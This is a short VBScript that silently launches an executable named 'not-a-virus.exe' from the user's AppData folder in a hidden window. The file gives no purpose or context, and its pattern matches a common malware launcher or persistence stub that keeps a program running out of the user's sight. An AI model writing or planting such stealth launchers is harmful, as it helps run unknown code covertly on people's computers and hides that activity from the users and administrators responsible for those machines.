Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "%appdata%\not-a-virus.exe" & Chr(34), 0
Set WshShell = Nothing